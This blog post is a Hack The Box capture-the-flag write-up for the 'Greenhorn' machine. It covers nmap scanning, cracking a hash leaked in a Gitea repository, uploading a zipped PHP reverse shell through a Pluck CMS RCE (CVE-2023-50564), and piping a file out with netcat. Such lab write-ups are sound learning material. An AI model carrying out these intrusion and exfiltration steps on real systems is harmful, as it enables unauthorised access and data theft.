---
layout: post
title:  "HTB: Greenhorn Writeup"
date:   2024-08-26 13:08:01 -0400
categories: CTF
---


This is a fun box. Usage starts with some thorough enumeration revaling a password hash. We find that password is reused on the admin portal, which opens up a file upload vulnerability (CVE), which gets us a reverse shell as www. Password reuse also works for a pivot here, so we switch to a new user before using a pretty cool python tool to deblur a shared password image. 


## Enumeration

As usual for an easy box, I set up a basic scan of the IP

{% highlight bash %}
nmap -sC -sV 10.10.11.25
nmap -p- 10.10.11.25
{% endhighlight%}

Which shows 
![image](https://github.com/user-attachments/assets/a847444f-815b-49b8-baa7-e9f147801bf7)

So I add greenhorn to /etc/hosts

{% highlight bash %}
echo '10.10.11.25 greenhorn.htb' | sudo tee -a /etc/hosts
{% endhighlight%}

The webpage has a couple welcome landing pages, with nothing interesting. 
![image](https://github.com/user-attachments/assets/609beccb-e957-4f54-97ab-03e489399c8d)
![image](https://github.com/user-attachments/assets/bdc78233-f144-48ff-8a3b-6ef74ff0939a)

But we do get the admin page pretty quick: 
![image](https://github.com/user-attachments/assets/0fb0f572-1804-44db-bba0-e0b146ad6a74)

Which shows version 4.7.18 for [pluck] (https://github.com/pluck-cms/pluck).
Looking for version-specific vulnerabilities turns up an RCE vulnerability for CVE-2023-50564. Too bad, it appears to need admin web access, which we don't have yet. 
![image](https://github.com/user-attachments/assets/273c0fb5-ab2d-4e19-b246-1acc53dd3551)

There don't appear to be default credentials, so I go check out the other open port. http://greenhorn.htb:3000
Which takes us to a gittea instance. 

Clicking in, we see a repository with pluck information. Ok, I'll bite. 
In login.php we find this bit, showing us how logins happen: 
![image](https://github.com/user-attachments/assets/77e14ae0-666f-4746-a363-43722779e480)

And in /data/settings/pass.php, we find this, which appears to be the same variable storing a hash: 
![image](https://github.com/user-attachments/assets/add85f06-2be1-4aa3-8c8f-f2d90ea554bd)

We don't even have to fire up hashcat, https://crackstation.net/ works right away. 
![image](https://github.com/user-attachments/assets/6d4b86f2-74e5-47a4-beb1-fe5b67225f3e)

And it's actually that easy. We don't even have to find a username. 
![image](https://github.com/user-attachments/assets/2f3fbcb9-288f-4d00-bd6c-7b9be0b3d9ea)

Now we can circle back to the vulnerability. I found this site most helpful. https://www.nu11secur1ty.com/2023/07/pluck-4718-fi-rce.html
A POC exists, but it's not a terribly complex vuln, so I opted to exploit it on my own. 
Quick trip to revshells, I opted for the PHP PentestMonkey shell. 

For the exploit, we have to navigate to options > manage modules > install a module
And uploading the .php file won't work, we have to convert it to a zip first. 

{% highlight bash %}
zip rev.zip rev.php
{% endhighlight%}

![image](https://github.com/user-attachments/assets/932b0556-b87d-4c71-88e0-9443deec149e)

Foothold secured!
![image](https://github.com/user-attachments/assets/878df8b4-86ea-48b9-9b40-e76a59f64ff2)

I spend some time looking around the webpage directories, but dont find much. Eventually I retry the password we found earlier. 

{% highlight bash %}
su - junior
{% endhighlight%}

Which is enough to get the user flag. 

![image](https://github.com/user-attachments/assets/25d0b311-9487-4717-a875-bac8858a209a)

I can also see an interesting pdf file, so I port it over to my machine. 
{% highlight bash %}
nc -lvp 8002 > OpenVAS.pdf
{% endhighlight%}

{% highlight bash %}
nc 10.10.14.67 8002 < ./'Using OpenVAS.pdf'
{% endhighlight%}

Which appears to be the Admin bragging to junior about their openvas privileges. 
![image](https://github.com/user-attachments/assets/39beb97e-cd4c-4a22-bf2e-f44fb8a74203)

After stumbling around for a while, I got pointed towards this repository: 
https://github.com/spipm/Depix
![image](https://github.com/user-attachments/assets/d0cf9353-ab2c-46f1-9733-47d098c8a23f)

Which looks pretty cool. It was little tempermental for me though. I couldn't screenshot from the pdf and use the pic, no matter how I zoomed or cropped. I eventually ended up using a webpage to pull the image directly. 
https://tools.pdf24.org/en/extract-images#s=1724698526623

{% highlight bash %}
python3 depix.py -p ../0.png ./images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png 
{% endhighlight%}

But it does work!

![image](https://github.com/user-attachments/assets/cae88432-d20f-4ce3-bdb0-cc62b2b3b5d0)

{% highlight bash %}
su - root 
{% endhighlight%}

![image](https://github.com/user-attachments/assets/4ab7cb1b-d952-46df-bfd0-986273f10010)


